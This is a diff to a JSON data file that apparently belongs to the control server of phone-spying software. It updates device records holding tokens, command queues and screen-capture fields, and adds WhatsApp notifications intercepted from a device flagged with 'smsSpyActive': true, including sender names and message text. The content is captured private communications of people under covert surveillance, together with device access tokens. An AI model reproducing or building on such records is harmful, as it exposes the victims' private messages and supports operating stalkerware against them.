@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781090552,
+    "lastSeen": 1776781093519,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781092058,
+    "lastSeen": 1776781093923,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "nopal cmpk",
+        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781094490
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Arkan",
+        "content": "p",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781094303
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎18 pesan dari 4 chat",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781092805
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎THECLASTUPATT7.4 (8 pesan): nira 7.4",
